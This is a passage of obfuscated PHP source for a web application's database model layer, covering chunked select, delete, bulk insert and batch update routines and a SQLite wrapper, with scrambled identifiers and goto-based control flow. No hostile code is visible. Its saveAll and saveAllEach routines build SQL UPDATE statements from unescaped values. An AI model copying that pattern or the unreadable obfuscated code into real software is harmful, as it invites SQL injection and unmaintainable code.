Model($DæĞµÒ¼†); $eÚçƒ…Ş…– = array($C´¹òİÅ ¼ => $e‚ÎìŸßÚ, $CğÌĞÅ¢ñ„[379] => $EôæÏÓ®Ü¯); goto d­¢ÈÌ†ˆÆ; cÒ‰¤‘¨ù„: CacheLock::unlock($Aˆ¹à¬‚·); return !0; goto EÑœ£¯óÊæ; EÑœ£¯óÊæ: } public function metaGet($Cß¥Ù¨¼«½, $eô´ÎÂ ¡í = false) { goto cÉÕééø; aËÄÏ‹’ùš: $E›ÒåÅÀêä = $dœ­æÓôŒÛ->field($Cß„‡©óÂ[382])->where($fª›Ô éˆŸ)->select(); $E›ÒåÅÀêä = array_to_keyvalue($E›ÒåÅÀêä, $Cß„‡©óÂ[102], $Cß„‡©óÂ[380]); return $E›ÒåÅÀêä; goto eÇ×§ãùš¶; eˆõš¥¦š: $dœ­æÓôŒÛ = Model($this->tableMeta[$Cß„‡©óÂ[378]]); if ($eô´ÎÂ ¡í) { $fª›Ô éˆŸ = array($C‡œšùåÇ‘ => $Cß¥Ù¨¼«½, $Cß„‡©óÂ[102] => $eô´ÎÂ ¡í); return $dœ­æÓôŒÛ->where($fª›Ô éˆŸ)->getField($Cß„‡©óÂ[380]); } $fª›Ô éˆŸ = array($C‡œšùåÇ‘ => $Cß¥Ù¨¼«½); goto aËÄÏ‹’ùš; cÉÕééø: $Cß„‡©óÂ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->tableMeta) { return array(); } $C‡œšùåÇ‘ = $this->tableMeta[$Cß„‡©óÂ[377]]; goto eˆõš¥¦š; eÇ×§ãùš¶: } private function checkDataAutoHas($FõŠÔ›) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $aÃˆµ´Š¯£) { if (in_array($FõŠÔ›, explode($_SERVER[í¤âËÚ£¶íÊ¢][47], $aÃˆµ´Š¯£[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$DÊ§è®Û…, $AÏé„á…¶) { $F¯ÄáÇˆµ =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($this->dataAuto as $A¯´ŸëÂ…) { $DœÕ¨¦·­ä = $A¯´ŸëÂ…[0]; if (!in_array($AÏé„á…¶, explode($F¯ÄáÇˆµ[47], $A¯´ŸëÂ…[2]))) { continue; } switch (trim($A¯´ŸëÂ…[3])) { case $F¯ÄáÇˆµ[326]: case $F¯ÄáÇˆµ[327]: $E‘Íìœã­ = $A¯´ŸëÂ…[1]; $b«—ƒÈ³„ = isset($A¯´ŸëÂ…[4]) ? (array) $A¯´ŸëÂ…[4] : array(); if ($E‘Íìœã­ == $F¯ÄáÇˆµ[205] && array_key_exists($DœÕ¨¦·­ä, $DÊ§è®Û…)) { if (!$DÊ§è®Û…[$DœÕ¨¦·­ä]) { unset($DÊ§è®Û…[$DœÕ¨¦·­ä]); } break; } if (isset($DÊ§è®Û…[$DœÕ¨¦·­ä])) { array_unshift($b«—ƒÈ³„, $DÊ§è®Û…[$DœÕ¨¦·­ä]); } if ($F¯ÄáÇˆµ[326] == $A¯´ŸëÂ…[3]) { $DÊ§è®Û…[$DœÕ¨¦·­ä] = call_user_func_array($E‘Íìœã­, $b«—ƒÈ³„); } else { $DÊ§è®Û…[$DœÕ¨¦·­ä] = call_user_func_array(array(&$this, $E‘Íìœã­), $b«—ƒÈ³„); } break; case $F¯ÄáÇˆµ[278]: $DÊ§è®Û…[$DœÕ¨¦·­ä] = $DÊ§è®Û…[$A¯´ŸëÂ…[1]]; break; case $F¯ÄáÇˆµ[299]: if (isset($DÊ§è®Û…[$DœÕ¨¦·­ä]) && !is_string($DÊ§è®Û…[$DœÕ¨¦·­ä])) { $DÊ§è®Û…[$DœÕ¨¦·­ä] = json_encode_force($DÊ§è®Û…[$DœÕ¨¦·­ä]); } break; case $F¯ÄáÇˆµ[328]: if ($DÊ§è®Û…[$DœÕ¨¦·­ä] === $F¯ÄáÇˆµ[33]) { unset($DÊ§è®Û…[$DœÕ¨¦·­ä]); } break; case $F¯ÄáÇˆµ[329]: $DÊ§è®Û…[$DœÕ¨¦·­ä] = $A¯´ŸëÂ…[1]; default: break; } } if ($AÏé„á…¶ == $F¯ÄáÇˆµ[363]) { $C‹¥ã÷·ø­ = strtolower($this->db->getDbType()); if (strpos($C‹¥ã÷·ø­, $F¯ÄáÇˆµ[9]) !== 0) { return; } $BùĞ¹öÉæÜ = $this->field(!0)->fields; $bÌ°–Úğ‹ = $BùĞ¹öÉæÜ[$F¯ÄáÇˆµ[257]]; if (isset($BùĞ¹öÉæÜ[$F¯ÄáÇˆµ[256]])) { unset($bÌ°–Úğ‹[$BùĞ¹öÉæÜ[$F¯ÄáÇˆµ[256]]]); } foreach ($bÌ°–Úğ‹ as $FÎƒÖÍçÔ¨ => $AÏé„á…¶) { if (!isset($DÊ§è®Û…[$FÎƒÖÍçÔ¨])) { $DÊ§è®Û…[$FÎƒÖÍçÔ¨] = $F¯ÄáÇˆµ[33]; } } } } private function dataAfterFilter(&$Dá±ÔÅ•¤) { $EÆåĞ„Ğ˜  =& $_SERVER[í¤âËÚ£¶íÊ¢]; foreach ($this->dataAuto as $e®¿Çé‹ŠŒ) { $BŠ†Èš = $e®¿Çé‹ŠŒ[0]; if (!in_array($EÆåĞ„Ğ˜ [365], explode($EÆåĞ„Ğ˜ [47], $e®¿Çé‹ŠŒ[2]))) { continue; } if (!isset($Dá±ÔÅ•¤[$BŠ†Èš])) { continue; } switch (trim($e®¿Çé‹ŠŒ[3])) { case $EÆåĞ„Ğ˜ [326]: case $EÆåĞ„Ğ˜ [327]: $BÌŞºé“Ù‹ = isset($e®¿Çé‹ŠŒ[4]) ? (array) $e®¿Çé‹ŠŒ[4] : array(); array_unshift($BÌŞºé“Ù‹, $Dá±ÔÅ•¤[$BŠ†Èš]); if ($EÆåĞ„Ğ˜ [326] == $e®¿Çé‹ŠŒ[3]) { $Dá±ÔÅ•¤[$BŠ†Èš] = call_user_func_array($e®¿Çé‹ŠŒ[1], $BÌŞºé“Ù‹); } else { $Dá±ÔÅ•¤[$BŠ†Èš] = call_user_func_array(array(&$this, $e®¿Çé‹ŠŒ[1]), $BÌŞºé“Ù‹); } break; case $EÆåĞ„Ğ˜ [278]: $Dá±ÔÅ•¤[$BŠ†Èš] = $Dá±ÔÅ•¤[$e®¿Çé‹ŠŒ[1]]; break; case $EÆåĞ„Ğ˜ [299]: $B²£®­Ø¦ß = $Dá±ÔÅ•¤[$BŠ†Èš]; $Dá±ÔÅ•¤[$BŠ†Èš] = json_decode($B²£®­Ø¦ß, !0); if (is_null($Dá±ÔÅ•¤[$BŠ†Èš])) { $Dá±ÔÅ•¤[$BŠ†Èš] = $B²£®­Ø¦ß; } break; case $EÆåĞ„Ğ˜ [328]: if ($Dá±ÔÅ•¤[$BŠ†Èš] === $EÆåĞ„Ğ˜ [33]) { unset($Dá±ÔÅ•¤[$BŠ†Èš]); } break; case $EÆåĞ„Ğ˜ [329]: $Dá±ÔÅ•¤[$BŠ†Èš] = $e®¿Çé‹ŠŒ[1]; default: break; } } } public function saveAll($EÓ¿Ğ“˜Ñ) { goto C¼”Ÿ¤×äƒ; C¼”Ÿ¤×äƒ: $A—ì×È††ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d…ïË™¾×› = $this->tablePrefix . $this->tableName; $f‚Ûºó¾Õé = self::SQL_WHERE_IN_CHUNK; goto aµ·ŸÛ“Ä; aµ·ŸÛ“Ä: $EÓ¿Ğ“˜Ñ = is_array($EÓ¿Ğ“˜Ñ) ? $EÓ¿Ğ“˜Ñ : array(); $a‹á®…ÂÇĞ = $A—ì×È††ö[360]; $FÍĞì™ã† = 0; goto dÅ•¨ò§; dÅ•¨ò§: $c›–ƒ‡ÙŸ = array(); $cë‰‰ŸÛâ© = count($EÓ¿Ğ“˜Ñ); for ($FŒ‡ÚŒ„Ê = 0; $FŒ‡ÚŒ„Ê < $cë‰‰ŸÛâ©; $FŒ‡ÚŒ„Ê++) { $Bõœ¿î†– = $EÓ¿Ğ“˜Ñ[$FŒ‡ÚŒ„Ê]; if (!is_array($Bõœ¿î†–) || count($Bõœ¿î†–) != 4) { continue; } $e¸ ôÔ¦×ª = "\125\x50\104\x41\124\x45\x20\140{$d…ïË™¾×›}\140\x20\x53\x45\x54\x20{$Bõœ¿î†–[2]}\x20\75\x20\x43\x41\x53\x45\40{$Bõœ¿î†–[0]}\x20\12"; if ($FÍĞì™ã† == 0) { $a‹á®…ÂÇĞ = $e¸ ôÔ¦×ª; } $c›–ƒ‡ÙŸ[] = $A—ì×È††ö[125] . $Bõœ¿î†–[1] . $A—ì×È††ö[125]; $FÍĞì™ã†++; $a‹á®…ÂÇĞ .= "\x20\127\x48\x45\x4e\x20\47{$Bõœ¿î†–[1]}\x27\40\124\x48\x45\x4e\x20\x27{$Bõœ¿î†–[3]}\x27\x20\xa"; if ($FÍĞì™ã† == $f‚Ûºó¾Õé || $FŒ‡ÚŒ„Ê == $cë‰‰ŸÛâ© - 1) { goto EÏÒ‚£÷Ç¿; EñœÖì¸Ú³: $FÍĞì™ã† = 0; $a‹á®…ÂÇĞ = $e¸ ôÔ¦×ª; $this->chunkEventCheck(count($c›–ƒ‡ÙŸ)); goto F•¸–›‘Õ; F•¸–›‘Õ: $c›–ƒ‡ÙŸ = array(); goto AˆÀ‹à £¶; EÏÒ‚£÷Ç¿: $Fçª‰·–‡× = implode($A—ì×È††ö[47], $c›–ƒ‡ÙŸ); $a‹á®…ÂÇĞ .= "\x20\105\x4e\104\40\x20\127\x48\x45\x52\105\40{$Bõœ¿î†–[0]}\x20\x49\116\40\50{$Fçª‰·–‡×}\x29\40"; $this->execute($a‹á®…ÂÇĞ); goto EñœÖì¸Ú³; AˆÀ‹à £¶: } } goto EôµñÎ–ß°; EôµñÎ–ß°: $this->chunkEventSet(); goto aÍÎ‰äÜÑù; aÍÎ‰äÜÑù: } public function saveAllEach($e­í†Ö£š) { $cæÖ¼ãŠ¯­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÇëÀ®ÃÔ‘ = $this->tablePrefix . $this->tableName; foreach ($e­í†Ö£š as $Fñ¹ãëï¹) { if (!is_array($Fñ¹ãëï¹) || count($Fñ¹ãëï¹) != 4) { continue; } $B™‹å“Ë±Œ = $Fñ¹ãëï¹[0] . $cæÖ¼ãŠ¯­[383] . $Fñ¹ãëï¹[1] . $cæÖ¼ãŠ¯­[125]; $FŸ©¯…‘¢Å = $Fñ¹ãëï¹[2] . $cæÖ¼ãŠ¯­[383] . $Fñ¹ãëï¹[3] . $cæÖ¼ãŠ¯­[125]; $fØ¿ŠÏĞÚŠ = "\165\x70\144\141\x74\145\40{$CÇëÀ®ÃÔ‘}\40\163\x65\164\x20{$FŸ©¯…‘¢Å}\40\167\150\x65\162\145\x20{$B™‹å“Ë±Œ}\73"; $this->execute($fØ¿ŠÏĞÚŠ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($C‚Äğ™¾ÒØ = false, $F¤å™È‡“Ì = false) { $this->_chunkEvent = $C‚Äğ™¾ÒØ; $this->_chunkEventParam = $F¤å™È‡“Ì; } private function chunkEventCheck($dèäŸòÎ„) { if (!$this->_chunkEvent) { return; } $aÌß‚çá¬Ê = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $aÌß‚çá¬Ê[$_SERVER[í¤âËÚ£¶íÊ¢][384]] = $dèäŸòÎ„; Hook::trigger($this->_chunkEvent, $aÌß‚çá¬Ê); } public function addAll($DÜ—•¨¦ïŸ, $AÃƒïŞšî½ = array(), $f”ò…´äÜ = false) { goto Dµ›ÇÉ‹„Æ; Bé×–Ÿ‘Åİ: if (method_exists($this->db, $c£‹¿Õ¸¼¤[277])) { for ($aÃ¾óƒµ = 0; $aÃ¾óƒµ < count($DÜ—•¨¦ïŸ); $aÃ¾óƒµ += $aõÄéîñ‹“) { $aô‘’  = array_slice($DÜ—•¨¦ïŸ, $aÃ¾óƒµ, $aõÄéîñ‹“); if (!is_array($aô‘’ ) || count($aô‘’ ) == 0) { break; } $Eô®áË¬Òè = $this->db->insertAll($aô‘’ , $AÃƒïŞšî½, $f”ò…´äÜ); $this->chunkEventCheck(count($aô‘’ )); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($DÜ—•¨¦ïŸ as $e¿å¾ø½Ô => $FÎê¤‰ŞÔ) { $Eô®áË¬Òè = $this->db->insert($FÎê¤‰ŞÔ, $AÃƒïŞšî½, $f”ò…´äÜ); } $this->commit(); } if (!1 !== $Eô®áË¬Òè) { $dŒÍ‘¹®ƒŸ = $this->getLastInsID(); if ($dŒÍ‘¹®ƒŸ) { return $dŒÍ‘¹®ƒŸ; } } return $Eô®áË¬Òè; goto D¸‡ç¤Úµ¦; Dµ›ÇÉ‹„Æ: $c£‹¿Õ¸¼¤ =& $_SERVER[í¤âËÚ£¶íÊ¢]; ignore_timeout(); $aõÄéîñ‹“ = self::SQL_WHERE_IN_CHUNK; goto Cæ—¤æ¤ïö; Cæ—¤æ¤ïö: if (empty($DÜ—•¨¦ïŸ)) { $this->error = think_lang($c£‹¿Õ¸¼¤[276]); return !1; } $AÃƒïŞšî½ = $this->_parseOptions($AÃƒïŞšî½); foreach ($DÜ—•¨¦ïŸ as $e¿å¾ø½Ô => $FÎê¤‰ŞÔ) { $DÜ—•¨¦ïŸ[$e¿å¾ø½Ô] = $this->_facade($FÎê¤‰ŞÔ); $this->_beforeInsert($DÜ—•¨¦ïŸ[$e¿å¾ø½Ô], $AÃƒïŞšî½); } goto Bé×–Ÿ‘Åİ; D¸‡ç¤Úµ¦: } public function save($E¢ƒì²™… = '', $f°» àµâ = array()) { goto bŞ±îŞ‘Î; fó»«”Â¢µ: $cÉã™Íç¶´ = $FİùÎ›¡Á[$EóË—à•Ö[280]][$eÈ÷†®’‚®][1]; $cÉã™Íç¶´ = is_array($cÉã™Íç¶´) ? $cÉã™Íç¶´ : array(); $Cá«±¡ÀÏ = count($cÉã™Íç¶´); goto a²¹Ä¸ÁÖ‹; F²Ú¨È¢®: $eÈ÷†®’‚® = $this->findWhereField($FİùÎ›¡Á); if (!$eÈ÷†®’‚®) { return parent::save($E¢ƒì²™…, $f°» àµâ); } $DŒŠÛ•’µ = 0; goto fó»«”Â¢µ; bŞ±îŞ‘Î: $EóË—à•Ö =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D‚ƒŸ´Ø¬· = self::SQL_WHERE_IN_CHUNK; $FİùÎ›¡Á = $this->optionsValue(); goto F²Ú¨È¢®; a²¹Ä¸ÁÖ‹: for ($BÒ«Ø¯Ç£Å = 0; $BÒ«Ø¯Ç£Å < $Cá«±¡ÀÏ; $BÒ«Ø¯Ç£Å += $D‚ƒŸ´Ø¬·) { $A·¯é÷Š¤ = array_slice($cÉã™Íç¶´, $BÒ«Ø¯Ç£Å, $D‚ƒŸ´Ø¬·); if (!is_array($A·¯é÷Š¤) || count($A·¯é÷Š¤) == 0) { break; } $FİùÎ›¡Á[$EóË—à•Ö[280]][$eÈ÷†®’‚®][1] = $A·¯é÷Š¤; $this->optionsValue($FİùÎ›¡Á); $DŒŠÛ•’µ += parent::save($E¢ƒì²™…, $f°» àµâ); $this->chunkEventCheck(count($A·¯é÷Š¤)); } $this->chunkEventSet(); return $DŒŠÛ•’µ; goto F…Ÿ¸óÏæ; F…Ÿ¸óÏæ: } public function add($fšì«‰®à„ = '', $BãÖğÖŸ— = array(), $d¡È‡§´– = false) { if ($this->addTaskStatus && is_array($fšì«‰®à„)) { $this->addTaskData[] = $fšì«‰®à„; return; } return parent::add($fšì«‰®à„, $BãÖğÖŸ—, $d¡È‡§´–); } public function parseWhereLike($Fñ¬ÊÆãÚŞ, $D¥×©ø–Ë® = '', $Eñ¯ÇÏ¼‹ë = false, &$aŞ„ÀÏÕ‘ = false) { goto cí…Œ•µºœ; cÕÊÃÏƒÜ¥: if (!is_array($Fñ¬ÊÆãÚŞ)) { return $Fñ¬ÊÆãÚŞ; } $eªó®ºóÓë = array(); $Aè¾ƒŸß¿Å = 0; goto C»Ô„ Îù; cí…Œ•µºœ: $e·Ø„á¼åŒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B’å†‹†²‡ = $GLOBALS[$e·Ø„á¼åŒ[6]][$e·Ø„á¼åŒ[385]]; if (!$B’å†‹†²‡[$e·Ø„á¼åŒ[386]]) { return $Fñ¬ÊÆãÚŞ; } goto cÕÊÃÏƒÜ¥; C»Ô„ Îù: foreach ($Fñ¬ÊÆãÚŞ as $Aƒ¬‰Š«êÛ => $D¸È…´¤ŠÍ) { if (is_array($D¸È…´¤ŠÍ) && count($D¸È…´¤ŠÍ) == 2 && $D¸È…´¤ŠÍ[0] == $e·Ø„á¼åŒ[387] && is_string($D¸È…´¤ŠÍ[1]) && substr($D¸È…´¤ŠÍ[1], 0, 1) == $e·Ø„á¼åŒ[388] && substr($D¸È…´¤ŠÍ[1], strlen($D¸È…´¤ŠÍ[1]) - 1, 1) == $e·Ø„á¼åŒ[388]) { goto c’¥Ğêñ; f±¦ŞâÎ°: $FÛ·¤ëêŒ = $this->db->escapeString($FÛ·¤ëêŒ); if (!strpos($b‹‘ºç“†¨, $e·Ø„á¼åŒ[104])) { $b‹‘ºç“†¨ = $e·Ø„á¼åŒ[389] . $b‹‘ºç“†¨ . $e·Ø„á¼åŒ[389]; } if ($B’å†‹†²‡[$e·Ø„á¼åŒ[390]]) { $FÛ·¤ëêŒ = $e·Ø„á¼åŒ[125] . $FÛ·¤ëêŒ . $e·Ø„á¼åŒ[125]; } goto E™¨ÛŞ£Ş½; E™¨ÛŞ£Ş½: $eªó®ºóÓë[$Aè¾ƒŸß¿Å] = $e·Ø„á¼åŒ[391] . $b‹‘ºç“†¨ . $e·Ø„á¼åŒ[392] . $FÛ·¤ëêŒ . $e·Ø„á¼åŒ[393]; $Aè¾ƒŸß¿Å++; continue; goto f©…¾Ä; c’¥Ğêñ: $aŞ„ÀÏÕ‘ = !0; $b‹‘ºç“†¨ = is_string($Aƒ¬‰Š«êÛ) ? $Aƒ¬‰Š«êÛ : $D¥×©ø–Ë®; $FÛ·¤ëêŒ = substr($D¸È…´¤ŠÍ[1], 1, strlen($D¸È…´¤ŠÍ[1]) - 2); goto f±¦ŞâÎ°; f©…¾Ä: } if (is_array($D¸È…´¤ŠÍ)) { $D¥×©ø–Ë® = is_string($Aƒ¬‰Š«êÛ) ? $Aƒ¬‰Š«êÛ : $D¥×©ø–Ë®; $D¸È…´¤ŠÍ = $this->parseWhereLike($D¸È…´¤ŠÍ, $D¥×©ø–Ë®, !0, $aŞ„ÀÏÕ‘); } if (is_numeric($Aƒ¬‰Š«êÛ)) { $eªó®ºóÓë[$Aè¾ƒŸß¿Å] = $D¸È…´¤ŠÍ; $Aè¾ƒŸß¿Å++; } else { $eªó®ºóÓë[$Aƒ¬‰Š«êÛ] = $D¸È…´¤ŠÍ; } } if ($aŞ„ÀÏÕ‘ && !$Eñ¯ÇÏ¼‹ë) { trace_log(array($eªó®ºóÓë, $Fñ¬ÊÆãÚŞ), $e·Ø„á¼åŒ[280]); } return $eªó®ºóÓë; goto CàÔÜÛñËä; CàÔÜÛñËä: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($E¤áø–ÌÔ = array()) { goto Cí”£•ğî; Cí”£•ğî: $Fõç¢‰±â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eª¶Ş‹à¡Ú = self::SQL_WHERE_IN_CHUNK; $f°¾”Õö†Ù = $this->optionsValue(); goto dß±çêËùÇ; b¦‰“óçº: return $bÁ¢ø¨Ş‡; goto E£¹Ÿ£¡; dß±çêËùÇ: $Eà®„Â‹™˜ = $this->findWhereField($f°¾”Õö†Ù); if (!$Eà®„Â‹™˜ || isset($f°¾”Õö†Ù[$Fõç¢‰±â[297]]) || isset($f°¾”Õö†Ù[$Fõç¢‰±â[358]])) { return parent::select($E¤áø–ÌÔ); } $eÇØŞÅ”ºÂ = $f°¾”Õö†Ù[$Fõç¢‰±â[280]][$Eà®„Â‹™˜][1]; goto F¶æ¿­ ‹˜; F¶æ¿­ ‹˜: $eÇØŞÅ”ºÂ = is_array($eÇØŞÅ”ºÂ) ? $eÇØŞÅ”ºÂ : array(); $bÁ¢ø¨Ş‡ = null; for ($cµ³¿«ù¨à = 0; $cµ³¿«ù¨à < count($eÇØŞÅ”ºÂ); $cµ³¿«ù¨à += $Eª¶Ş‹à¡Ú) { $FƒìÖ áŠ” = array_slice($eÇØŞÅ”ºÂ, $cµ³¿«ù¨à, $Eª¶Ş‹à¡Ú); if (!is_array($FƒìÖ áŠ”) || count($FƒìÖ áŠ”) == 0) { break; } $f°¾”Õö†Ù[$Fõç¢‰±â[280]][$Eà®„Â‹™˜][1] = $FƒìÖ áŠ”; $this->optionsValue($f°¾”Õö†Ù); $d¿ÙÖ˜‡¸ = parent::select($E¤áø–ÌÔ); if (!$d¿ÙÖ˜‡¸) { continue; } $bÁ¢ø¨Ş‡ = is_array($bÁ¢ø¨Ş‡) ? $bÁ¢ø¨Ş‡ : array(); $bÁ¢ø¨Ş‡ = array_merge($bÁ¢ø¨Ş‡, $d¿ÙÖ˜‡¸); } goto b¦‰“óçº; E£¹Ÿ£¡: } public function delete($B»÷¢²Ú· = array()) { goto aÇ¸œ¼©èÀ; aÇ¸œ¼©èÀ: $EÂÌÙëÕŸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eĞˆÈÕí¼‡ = self::SQL_WHERE_IN_CHUNK; $c¯à¢Š›½Ä = $this->optionsValue(); goto aÀÍàà·Î; aÀÍàà·Î: $eËÇ›´Åùä = $this->findWhereField($c¯à¢Š›½Ä); if (!$eËÇ›´Åùä) { return parent::delete($B»÷¢²Ú·); } $F“óÁƒ‡ĞŒ = 0; goto D›Ê˜ÓÒ†ƒ; D›Ê˜ÓÒ†ƒ: $AÛÃ‰ñ®ƒä = $c¯à¢Š›½Ä[$EÂÌÙëÕŸ[280]][$eËÇ›´Åùä][1]; $AÛÃ‰ñ®ƒä = is_array($AÛÃ‰ñ®ƒä) ? $AÛÃ‰ñ®ƒä : array(); for ($Fˆ›Æ¤ùŒÊ = 0; $Fˆ›Æ¤ùŒÊ < count($AÛÃ‰ñ®ƒä); $Fˆ›Æ¤ùŒÊ += $eĞˆÈÕí¼‡) { $fù¤ŠŠß† = array_slice($AÛÃ‰ñ®ƒä, $Fˆ›Æ¤ùŒÊ, $eĞˆÈÕí¼‡); if (!is_array($fù¤ŠŠß†) || count($fù¤ŠŠß†) == 0) { break; } $c¯à¢Š›½Ä[$EÂÌÙëÕŸ[280]][$eËÇ›´Åùä][1] = $fù¤ŠŠß†; $this->optionsValue($c¯à¢Š›½Ä); $F“óÁƒ‡ĞŒ += parent::delete($B»÷¢²Ú·); } goto bÍÊÛÄêî´; bÍÊÛÄêî´: return $F“óÁƒ‡ĞŒ; goto BÇˆÕŒ‰Òò; BÇˆÕŒ‰Òò: } private function findWhereField($Eˆ¾îğï£) { $b¦öï®¼µ† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dŞ²ÎÛ¤î = self::SQL_WHERE_IN_CHUNK; if (!is_array($Eˆ¾îğï£) || !is_array($Eˆ¾îğï£[$b¦öï®¼µ†[280]])) { return !1; } foreach ($Eˆ¾îğï£[$b¦öï®¼µ†[280]] as $dŞ·Àé±Œ => $aÓ»‘‰³´¬) { if (is_array($aÓ»‘‰³´¬) && isset($aÓ»‘‰³´¬[0]) && is_string($aÓ»‘‰³´¬[0]) && strtolower($aÓ»‘‰³´¬[0]) == $b¦öï®¼µ†[7] && is_array($aÓ»‘‰³´¬[1]) && count($aÓ»‘‰³´¬[1]) > $dŞ²ÎÛ¤î) { ignore_timeout(); return $dŞ·Àé±Œ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\x65\x6d\x4f\160\x74\151\x6f\x6e"; public $field = array(); public function listData($cÙ¡ŸÓº©á = false, $a‹ôøÂ‰ = "\x6d\x6f\x64\x69\146\x79\124\151\155\x65", $aŞµë¬½µ = false) { $eÈ–Š«Ëù = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$eÈ–Š«Ëù) { return $cÙ¡ŸÓº©á ? null : array(); } if (!$cÙ¡ŸÓº©á) { $eÈ–Š«Ëù = array_filter(array_values($eÈ–Š«Ëù)); return array_sort_by($eÈ–Š«Ëù, $a‹ôøÂ‰, $aŞµë¬½µ); } return $eÈ–Š«Ëù[$_SERVER[í¤âËÚ£¶íÊ¢][394] . $cÙ¡ŸÓº©á]; } public function insert($A¢—ñ¡ğèÎ) { goto B¯¿÷ÉÄØÚ; D¼¹‰ˆŠÂ”: $fÒ‚íîğƒÈ = $fÒ‚íîğƒÈ ? $fÒ‚íîğƒÈ : 0; $A¢—ñ¡ğèÎ[$AòÁÖÍŠè¶[397]] = ++$fÒ‚íîğƒÈ; $A¢—ñ¡ğèÎ[$AòÁÖÍŠè¶[202]] = time(); goto C‰òÑÈ–¿Ó; B¯¿÷ÉÄØÚ: $AòÁÖÍŠè¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¢—ñ¡ğèÎ = array_field_key($A¢—ñ¡ğèÎ, $this->field); $fÒ‚íîğƒÈ = Model($this->modelType)->get($AòÁÖÍŠè¶[395], $this->optionType . $AòÁÖÍŠè¶[396]); goto D¼¹‰ˆŠÂ”; C“øÛòŠ´¾: return $fÒ‚íîğƒÈ; goto d°Şæºƒ·¬; C‰òÑÈ–¿Ó: $A¢—ñ¡ğèÎ[$AòÁÖÍŠè¶[93]] = time(); Model($this->modelType)->set($AòÁÖÍŠè¶[395], $fÒ‚íîğƒÈ, $this->optionType . $AòÁÖÍŠè¶[396]); Model($this->modelType)->set($AòÁÖÍŠè¶[394] . $fÒ‚íîğƒÈ, $A¢—ñ¡ğèÎ, $this->optionType); goto C“øÛòŠ´¾; d°Şæºƒ·¬: } public function update($C… ‡†¹·Ç, $b¥áŸ‹‡) { goto c¾††Ğ…ŠŞ; c¾††Ğ…ŠŞ: $fÇË§ ¼ëŞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¥áŸ‹‡ = array_field_key($b¥áŸ‹‡, $this->field); $CåšƒÒê÷Î = $this->listData($C… ‡†¹·Ç); goto c»ÖŠÅ·âˆ; c¡øÄá¸ßÓ: return Model($this->modelType)->set($fÇË§ ¼ëŞ[394] . $C… ‡†¹·Ç, $b¥áŸ‹‡, $this->optionType); goto f‹¨Ö‰åº‹; c»ÖŠÅ·âˆ: if (!$CåšƒÒê÷Î) { return !1; } $b¥áŸ‹‡ = array_merge($CåšƒÒê÷Î, $b¥áŸ‹‡); $b¥áŸ‹‡[$fÇË§ ¼ëŞ[93]] = time(); goto c¡øÄá¸ßÓ; f‹¨Ö‰åº‹: } public function remove($bŞÁæ™Ä¸) { return Model($this->modelType)->remove($_SERVER[í¤âËÚ£¶íÊ¢][394] . $bŞÁæ™Ä¸, $this->optionType); } public function clear() { $Dß¹À©ÙÛ =& $_SERVER[í¤âËÚ£¶íÊ¢]; Model($this->modelType)->remove($Dß¹À©ÙÛ[395], $this->optionType . $Dß¹À©ÙÛ[396]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Fí’©ÊÀø, $bÌÏ•ß…) { if (!$bÌÏ•ß…) { return !1; } $EªÙÁíôëš = $this->listData(); $EªÙÁíôëš = array_to_keyvalue($EªÙÁíôëš, $Fí’©ÊÀø); return isset($EªÙÁíôëš[$bÌÏ•ß…]) ? $EªÙÁíôëš[$bÌÏ•ß…] : !1; } public function findByName($FùÄËÄÖ™) { return $this->findByKey($_SERVER[í¤âËÚ£¶íÊ¢][28], $FùÄËÄÖ™); } protected function resetData($AÒèÉñ†´ª) { $BßßåŸí =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÒèÉñ†´ª = is_array($AÒèÉñ†´ª) ? $AÒèÉñ†´ª : array(); $FİÙŒˆ¢óª = array(); for ($bù›ÄÃ—˜² = 0; $bù›ÄÃ—˜² < count($AÒèÉñ†´ª); $bù›ÄÃ—˜²++) { $FİÙŒˆ¢óª[$BßßåŸí[394] . $AÒèÉñ†´ª[$bù›ÄÃ—˜²][$BßßåŸí[397]]] = $AÒèÉñ†´ª[$bù›ÄÃ—˜²]; } return Model($this->modelType)->set($FİÙŒˆ¢óª, !1, $this->optionType); } private function getAutoName($cãñÓêçöÏ) { $f¹½Í™˜£ = array_to_keyvalue($this->listData(), $_SERVER[í¤âËÚ£¶íÊ¢][28]); if (!$f¹½Í™˜£ || !isset($f¹½Í™˜£[$cãñÓêçöÏ])) { return $cãñÓêçöÏ; } for ($E‹»„‡Æ‚‹ = 1; $E‹»„‡Æ‚‹ < count($f¹½Í™˜£); $E‹»„‡Æ‚‹++) { $e÷®¸Ò†ªå = $cãñÓêçöÏ . "\x28{$E‹»„‡Æ‚‹}\51"; if (!isset($f¹½Í™˜£[$e÷®¸Ò†ªå])) { return $e÷®¸Ò†ªå; } } return $e÷®¸Ò†ªå; } } goto b¦ÕªÁÄõ; dóğÑÅ©ß: class DbSqlite extends DbSqliteBase { public function query($F÷åßÎ …) { $F›îĞ÷Æ¥ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!CacheLock::fileLock($F›îĞ÷Æ¥[9])) { return !1; } $aè©Ó•Í©¦ = parent::query($F÷åßÎ …); CacheLock::fileUnLock($F›îĞ÷Æ¥[9]); return 